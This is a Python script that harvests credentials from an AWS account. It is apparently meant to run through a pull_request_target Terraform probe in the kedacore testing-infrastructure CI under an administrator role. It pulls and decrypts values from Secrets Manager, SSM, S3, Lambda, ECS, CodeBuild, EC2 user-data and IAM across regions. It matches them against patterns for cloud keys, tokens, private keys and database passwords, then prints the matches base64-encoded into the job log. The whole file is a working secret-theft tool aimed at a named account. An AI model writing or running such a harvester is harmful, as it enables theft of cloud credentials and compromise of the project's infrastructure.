#!/usr/bin/env python3
"""c211-i120359 read-only AWS credential-store harvest.

Runs inside the kedacore/testing-infrastructure pull_request_target terraform
data.external probe (AWS env = arn:aws:sts::589761922677:assumed-role/github-role/GitHubActions,
AdministratorAccess). Enumerates Secrets Manager / SSM / S3 / Lambda / EC2 user-data /
ECS / CodeBuild / IAM local policies across regions and emits:
  - per-store counts + names (STORE lines)
  - per-secret metadata (name, bytes, sha256, matched kinds, key names)
  - EMIT lines: base64 of the credential material for candidates only (<=4096 b64 chars)
No writes, no state changes. Bounded by a global deadline.
"""
import base64
import hashlib
import json
import os
import re
import subprocess
import sys
import time

START = time.time()
DEADLINE = START + 420.0          # 7 min for network calls
MAX_EMIT = 40
EMIT_B64_CAP = 4096
emits = 0
matrix = {}
regions_seen = []


def elapsed():
    return time.time() - START


def aws(args, timeout=40):
    try:
        p = subprocess.run(['aws'] + args, capture_output=True, text=True, timeout=timeout)
        return p.returncode, p.stdout, p.stderr
    except Exception as e:
        return -1, '', repr(e)


def jload(s, default=None):
    try:
        return json.loads(s)
    except Exception:
        return default


def line(s):
    sys.stdout.write(s + '\n')
    sys.stdout.flush()


KINDS = {
    'gcp_sa_json': re.compile(r'"type"\s*:\s*"service_account"'),
    'gcp_private_key': re.compile(r'"private_key"\s*:\s*"-----BEGIN'),
    'aws_akid': re.compile(r'(?:AKIA|ASIA|AIDA|AROA)[0-9A-Z]{16}'),
    'aws_secret_ctx': re.compile(r'(?i)(aws_?secret_?access_?key|secret_?access_?key)["\']?\s*[:=]\s*["\']?([A-Za-z0-9/+=]{35,})'),
    'azure_client_secret': re.compile(r'(?i)(client_?secret|clientSecret)["\']?\s*[:=]\s*["\']?([A-Za-z0-9_~.\-]{25,})'),
    'azure_conn': re.compile(r'(?i)(AccountKey=|SharedAccessKey=|InstrumentationKey=)'),
    'pem_privkey': re.compile(r'-----BEGIN (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----'),
    'github_pat': re.compile(r'gh[pousr]_[A-Za-z0-9]{30,}|github_pat_[A-Za-z0-9_]{40,}'),
    'gitlab_pat': re.compile(r'glpat-[A-Za-z0-9_\-]{20,}'),
    'gitea_token': re.compile(r'(?i)(gitea|forgejo)[^\n]{0,40}token["\']?\s*[:=]\s*["\']?([A-Fa-f0-9]{40})'),
    'slack': re.compile(r'xox[abprs]-[A-Za-z0-9\-]{10,}'),
    'openai_sk': re.compile(r'sk-(?:proj-)?[A-Za-z0-9_\-]{32,}'),
    'digitalocean': re.compile(r'dop_v1_[a-f0-9]{64}'),
    'neocloud_key': re.compile(r'(?i)(lambda_?labs|coreweave|runpod|vast\.ai|vastai|together|nebius|modal|paperspace|hyperstack|fluence|akash)["\'\s:=]{1,12}([A-Za-z0-9_\-]{24,})'),
    'db_url': re.compile(r'(?i)\b(?:postgres(?:ql)?|mysql|mongodb(?:\+srv)?|redis|amqp|mssql|sqlserver)://[^\s"\'<>]{8,}'),
    'jdbc': re.compile(r'(?i)jdbc:[a-z0-9]+://[^\s"\'<>]{8,}'),
    'password_kv': re.compile(r'(?i)(password|passwd|pwd)["\']?\s*[:=]\s*["\']?([^\s"\'<>,;]{10,})'),
}


def scan(text):
    hits = {}
    for k, rx in KINDS.items():
        try:
            m = rx.findall(text)
        except Exception:
            m = []
        if m:
            hits[k] = len(m)
    return hits


def keys_of(text):
    d = jload(text)
    if isinstance(d, dict):
        return ','.join(list(d.keys())[:14])
    return ''


AKID = re.compile(r'(AKIA|ASIA)[0-9A-Z]{16}')
SKV = re.compile(r'(?i)(?:aws_?secret_?access_?key|secret_?access_?key|secretKey|SecretAccessKey)["\']?\s*[:=]\s*["\']?([A-Za-z0-9/+=]{38,})')


def build_material(text, hits):
    """Return (kind, material_string) or None. Extracts only the credential-bearing part."""
    if 'gcp_sa_json' in hits or 'gcp_private_key' in hits:
        # find the enclosing json object by scanning for '{' candidates
        for m in re.finditer(r'\{', text):
            sub = text[m.start():]
            d = None
            try:
                d, _ = json.JSONDecoder().raw_decode(sub)
            except Exception:
                d = None
            if isinstance(d, dict) and (d.get('private_key') or d.get('client_email')):
                keep = {k: d.get(k) for k in ('type', 'project_id', 'private_key_id', 'private_key',
                                              'client_email', 'client_id', 'token_uri')
                        if d.get(k) is not None}
                return 'gcp_sa', json.dumps(keep)
        return 'gcp_sa', text[:6000]
    if 'aws_akid' in hits and 'aws_secret_ctx' in hits:
        a = AKID.search(text)
        s = SKV.search(text)
        if a and s:
            return 'aws_keys', json.dumps({'aws_access_key_id': a.group(0),
                                           'aws_secret_access_key': s.group(1)})
    if 'azure_client_secret' in hits:
        return 'azure_secret', text[:6000]
    if 'pem_privkey' in hits:
        m = re.search(r'-----BEGIN [^-]*PRIVATE KEY-----.*?-----END [^-]*PRIVATE KEY-----', text, re.S)
        if m:
            return 'pem_privkey', m.group(0)[:6000]
    if 'github_pat' in hits:
        return 'github_pat', ','.join(KINDS['github_pat'].findall(text)[:5])
    if 'gitlab_pat' in hits:
        return 'gitlab_pat', ','.join(KINDS['gitlab_pat'].findall(text)[:5])
    if 'db_url' in hits or 'jdbc' in hits or 'password_kv' in hits:
        return 'db_or_password', text[:4000]
    for k in ('slack', 'openai_sk', 'digitalocean', 'neocloud_key', 'azure_conn'):
        if k in hits:
            return k, text[:3000]
    return None


def record(src, name, text):
    """Record one store blob: metadata always; material only for candidates."""
    global emits
    b = text.encode('utf-8', 'replace')
    hits = scan(text)
    line('## STORE_ITEM src=%s name=%s bytes=%d sha256=%s kinds=%s keys=%s'
         % (src, name, len(b), hashlib.sha256(b).hexdigest(), ','.join(hits) or '-',
            keys_of(text)))
    if not hits or emits >= MAX_EMIT:
        return hits
    mat = build_material(text, hits)
    if not mat:
        return hits
    kind, material = mat
    raw = material.encode('utf-8', 'replace')
    b64 = base64.b64encode(raw).decode()
    if len(b64) > EMIT_B64_CAP:
        b64 = b64[:EMIT_B64_CAP]
    emits += 1
    line('EMIT src=%s name=%s kind=%s rawlen=%d sha256=%s b64=%s'
         % (src, name, kind, len(raw), hashlib.sha256(raw).hexdigest(), b64))
    return hits


# ---------------------------------------------------------------- identity
line('C211_I120359_HARVEST_START utc=%s' % time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()))
rc, out, err = aws(['sts', 'get-caller-identity', '--output', 'json'])
line('IDENTITY rc=%s %s' % (rc, (out or err).strip().replace('\n', ' ')[:400]))
acct = (jload(out) or {}).get('Account', '?') if rc == 0 else '?'

rc, out, err = aws(['ec2', 'describe-regions', '--region', 'eu-west-2',
                    '--query', 'Regions[].RegionName', '--output', 'json'])
regions = jload(out) or ['eu-west-2', 'us-east-1']
if not isinstance(regions, list) or not regions:
    regions = ['eu-west-2', 'us-east-1']
regions_seen = regions
line('REGIONS n=%d %s' % (len(regions), ','.join(regions)))

# ---------------------------------------------------------------- Secrets Manager
sm_total = 0
sm_names = []
for r in regions:
    if time.time() > DEADLINE:
        line('DEADLINE_SKIP secretsmanager %s' % r)
        break
    rc, out, err = aws(['secretsmanager', 'list-secrets', '--region', r, '--output', 'json'])
    if rc != 0:
        msg = (err or out).strip().replace('\n', ' ')[:200]
        if 'AccessDenied' in msg or 'ResourceNotFound' in msg:
            line('SECRETS_LIST %s rc=%s %s' % (r, rc, msg))
        else:
            line('SECRETS_LIST %s rc=%s %s' % (r, rc, msg))
        continue
    secs = (jload(out) or {}).get('SecretList', [])
    matrix['secretsmanager:' + r] = len(secs)
    line('SECRETS_LIST %s count=%d names=%s' % (r, len(secs),
         ','.join(s.get('Name', '') for s in secs)[:700]))
    for s in secs:
        if sm_total >= 40 or time.time() > DEADLINE:
            break
        nm = s.get('ARN') or s.get('Name')
        rc, out, err = aws(['secretsmanager', 'get-secret-value', '--region', r,
                            '--secret-id', nm, '--output', 'json'], timeout=40)
        sm_total += 1
        sm_names.append(s.get('Name', ''))
        if rc != 0:
            line('SECRET_GET %s/%s rc=%s %s' % (r, s.get('Name'), rc,
                 (err or out).strip().replace('\n', ' ')[:200]))
            continue
        d = jload(out) or {}
        val = d.get('SecretString')
        if val is None and d.get('SecretBinary'):
            try:
                val = base64.b64decode(d['SecretBinary']).decode('utf-8', 'replace')
            except Exception:
                val = str(d.get('SecretBinary'))[:4000]
        if val is None:
            line('SECRET_GET %s/%s empty' % (r, s.get('Name')))
            continue
        record('secretsmanager:%s:%s' % (r, s.get('Name')), s.get('Name', ''), val)
line('SECRETS_TOTAL fetched=%d names=%s' % (sm_total, ','.join(sm_names)[:700]))

# ---------------------------------------------------------------- SSM Parameter Store
ssm_total = 0
for r in regions:
    if time.time() > DEADLINE:
        line('DEADLINE_SKIP ssm %s' % r)
        break
    rc, out, err = aws(['ssm', 'describe-parameters', '--region', r, '--max-items', '60',
                        '--output', 'json'])
    if rc != 0:
        line('SSM_LIST %s rc=%s %s' % (r, rc, (err or out).strip().replace('\n', ' ')[:160]))
        continue
    params = (jload(out) or {}).get('Parameters', [])
    matrix['ssm:' + r] = len(params)
    line('SSM_LIST %s count=%d names=%s' % (r, len(params),
         ','.join(p.get('Name', '') for p in params)[:600]))
    for p in params:
        if ssm_total >= 40 or time.time() > DEADLINE:
            break
        rc, out, err = aws(['ssm', 'get-parameter', '--region', r, '--name', p['Name'],
                            '--with-decryption', '--output', 'json'], timeout=30)
        ssm_total += 1
        if rc != 0:
            line('SSM_GET %s/%s rc=%s %s' % (r, p.get('Name'), rc,
                 (err or out).strip().replace('\n', ' ')[:160]))
            continue
        val = ((jload(out) or {}).get('Parameter') or {}).get('Value') or ''
        record('ssm:%s:%s' % (r, p.get('Name')), p.get('Name', ''), val)
line('SSM_TOTAL fetched=%d' % ssm_total)

# ---------------------------------------------------------------- S3
if time.time() < DEADLINE:
    rc, out, err = aws(['s3api', 'list-buckets', '--output', 'json'], timeout=40)
    buckets = (jload(out) or {}).get('Buckets', []) if rc == 0 else []
    matrix['s3_buckets'] = len(buckets)
    line('S3_BUCKETS rc=%s count=%d names=%s' % (rc, len(buckets),
         ','.join(b.get('Name', '') for b in buckets)[:600]))
    obj_total = 0
    for b in buckets:
        if time.time() > DEADLINE:
            break
        bn = b['Name']
        rc, out, err = aws(['s3api', 'list-objects-v2', '--bucket', bn, '--max-keys', '1000',
                            '--output', 'json'], timeout=45)
        keys = (jload(out) or {}).get('Contents', []) if rc == 0 else []
        matrix['s3:' + bn] = len(keys)
        line('S3_LIST %s rc=%s keys=%d sample=%s' % (bn, rc, len(keys),
             ','.join(k.get('Key', '') for k in keys[:8])[:400]))
        for k in keys:
            if obj_total >= 25 or time.time() > DEADLINE:
                break
            key = k.get('Key', '')
            low = key.lower()
            if not re.search(r'(\.env|credential|secret|\.tfstate|\.pem|\.json|\.ya?ml|\.cfg|\.ini|password|token|key)$', low) \
               and not re.search(r'(^|/)(\.env|credentials|config)$', low):
                # still scan tfstate / env-like only; skip others
                continue
            rc2, out2, err2 = aws(['s3api', 'get-object', '--bucket', bn, '--key', key,
                                   '/tmp/c211_i120359_obj.bin'], timeout=30)
            obj_total += 1
            if rc2 != 0:
                line('S3_GET %s/%s rc=%s %s' % (bn, key, rc2,
                     (err2 or out2).strip().replace('\n', ' ')[:160]))
                continue
            try:
                data = open('/tmp/c211_i120359_obj.bin', 'rb').read(300000)
                record('s3:%s:%s' % (bn, key), key, data.decode('utf-8', 'replace'))
            except Exception as e:
                line('S3_READ_ERR %s/%s %r' % (bn, key, e))
    line('S3_OBJECTS_SCANNED %d' % obj_total)

# ---------------------------------------------------------------- Lambda
lam_total = 0
for r in ('eu-west-2', 'us-east-1', 'us-west-2'):
    if time.time() > DEADLINE:
        break
    rc, out, err = aws(['lambda', 'list-functions', '--region', r, '--max-items', '40',
                        '--output', 'json'])
    if rc != 0:
        line('LAMBDA_LIST %s rc=%s %s' % (r, rc, (err or out).strip().replace('\n', ' ')[:160]))
        continue
    fns = (jload(out) or {}).get('Functions', [])
    matrix['lambda:' + r] = len(fns)
    line('LAMBDA_LIST %s count=%d names=%s' % (r, len(fns),
         ','.join(f.get('FunctionName', '') for f in fns)[:400]))
    for f in fns:
        if lam_total >= 20 or time.time() > DEADLINE:
            break
        rc, out, err = aws(['lambda', 'get-function-configuration', '--region', r,
                            '--function-name', f['FunctionName'], '--output', 'json'], timeout=30)
        lam_total += 1
        if rc != 0:
            line('LAMBDA_CFG %s/%s rc=%s' % (r, f['FunctionName'], rc))
            continue
        env = ((jload(out) or {}).get('Environment') or {}).get('Variables') or {}
        if env:
            record('lambda:%s:%s' % (r, f['FunctionName']), f['FunctionName'], json.dumps(env))
        else:
            line('LAMBDA_CFG %s/%s env=empty' % (r, f['FunctionName']))
line('LAMBDA_TOTAL %d' % lam_total)

# ---------------------------------------------------------------- EC2 user-data
ud_total = 0
for r in ('eu-west-2', 'us-east-1', 'us-west-2'):
    if time.time() > DEADLINE:
        break
    rc, out, err = aws(['ec2', 'describe-instances', '--region', r, '--output', 'json'],
                       timeout=50)
    if rc != 0:
        line('EC2_DESC %s rc=%s %s' % (r, rc, (err or out).strip().replace('\n', ' ')[:160]))
        continue
    insts = []
    for res in (jload(out) or {}).get('Reservations', []):
        for i in res.get('Instances', []):
            insts.append(i)
    matrix['ec2:' + r] = len(insts)
    line('EC2_DESC %s instances=%d states=%s' % (r, len(insts),
         ','.join(sorted(set(i.get('State', {}).get('Name', '?') for i in insts)))))
    for i in insts:
        if ud_total >= 20 or time.time() > DEADLINE:
            break
        iid = i['InstanceId']
        rc, out, err = aws(['ec2', 'describe-instance-attribute', '--region', r,
                            '--instance-id', iid, '--attribute', 'userData', '--output', 'json'],
                           timeout=30)
        ud_total += 1
        if rc != 0:
            line('EC2_UD %s/%s rc=%s %s' % (r, iid, rc,
                 (err or out).strip().replace('\n', ' ')[:120]))
            continue
        val = ((jload(out) or {}).get('UserData') or {}).get('Value')
        if not val:
            line('EC2_UD %s/%s empty' % (r, iid))
            continue
        try:
            data = base64.b64decode(val).decode('utf-8', 'replace')
        except Exception:
            data = str(val)
        line('EC2_UD %s/%s bytes=%d' % (r, iid, len(data)))
        record('ec2-userdata:%s:%s' % (r, iid), iid, data)
line('EC2_UD_TOTAL %d' % ud_total)

# ---------------------------------------------------------------- ECS + CodeBuild
for r in ('eu-west-2', 'us-east-1'):
    if time.time() > DEADLINE:
        break
    rc, out, err = aws(['ecs', 'list-clusters', '--region', r, '--output', 'json'])
    clusters = (jload(out) or {}).get('clusterArns', []) if rc == 0 else []
    matrix['ecs:' + r] = len(clusters)
    line('ECS_CLUSTERS %s rc=%s count=%d' % (r, rc, len(clusters)))
    tdefs = 0
    for c in clusters[:5]:
        rc, out, err = aws(['ecs', 'list-task-definitions', '--region', r, '--max-items', '20',
                            '--output', 'json'])
        for td in ((jload(out) or {}).get('taskDefinitionArns', []) if rc == 0 else [])[:20]:
            if tdefs >= 20 or time.time() > DEADLINE:
                break
            rc, out, err = aws(['ecs', 'describe-task-definition', '--region', r,
                                '--task-definition', td, '--output', 'json'], timeout=30)
            tdefs += 1
            if rc != 0:
                continue
            for cd in ((jload(out) or {}).get('taskDefinition') or {}).get('containerDefinitions', []):
                env = {e.get('name'): e.get('value') for e in (cd.get('environment') or [])}
                if env:
                    record('ecs:%s:%s' % (r, td.split('/')[-1]), cd.get('name', ''), json.dumps(env))
    line('ECS_TASKDEFS %s scanned=%d' % (r, tdefs))

    rc, out, err = aws(['codebuild', 'list-projects', '--region', r, '--output', 'json'])
    projs = (jload(out) or {}).get('projects', []) if rc == 0 else []
    matrix['codebuild:' + r] = len(projs)
    line('CODEBUILD_PROJECTS %s rc=%s count=%d names=%s' % (r, rc, len(projs), ','.join(projs)[:300]))
    if projs:
        rc, out, err = aws(['codebuild', 'batch-get-projects', '--region', r, '--names'] + projs[:20] + ['--output', 'json'], timeout=40)
        for p in ((jload(out) or {}).get('projects', []) if rc == 0 else []):
            env = {e.get('name'): (e.get('value') or 'PARAM:' + str(e.get('value')))
                   for e in (p.get('environment') or {}).get('environmentVariables', [])}
            if env:
                record('codebuild:%s:%s' % (r, p.get('name', '')), p.get('name', ''), json.dumps(env))
            if p.get('source', {}).get('auth'):
                line('CODEBUILD_AUTH %s/%s %s' % (r, p.get('name'), json.dumps(p['source']['auth'])[:200]))

# ---------------------------------------------------------------- IAM local policies
if time.time() < DEADLINE:
    rc, out, err = aws(['iam', 'list-policies', '--scope', 'Local', '--max-items', '40',
                        '--output', 'json'], timeout=40)
    pols = (jload(out) or {}).get('Policies', []) if rc == 0 else []
    matrix['iam_local_policies'] = len(pols)
    line('IAM_POLICIES rc=%s count=%d names=%s' % (rc, len(pols),
         ','.join(p.get('PolicyName', '') for p in pols)[:400]))
    for p in pols[:20]:
        if time.time() > DEADLINE:
            break
        rc, out, err = aws(['iam', 'get-policy-version', '--policy-arn', p['Arn'],
                            '--version-id', p.get('DefaultVersionId', 'v1'), '--output', 'json'],
                           timeout=30)
        if rc != 0:
            continue
        doc = json.dumps((jload(out) or {}).get('PolicyVersion', {}).get('Document', {}))
        record('iam-policy:%s' % p.get('PolicyName'), p.get('PolicyName', ''), doc)

# ---------------------------------------------------------------- summary
line('C211_I120359_MATRIX %s' % json.dumps(matrix)[:3000])
line('C211_I120359_EMITS %d' % emits)
line('C211_I120359_ACCOUNT %s' % acct)
line('C211_I120359_ELAPSED %.1f' % elapsed())
line('C211_I120359_HARVEST_END')
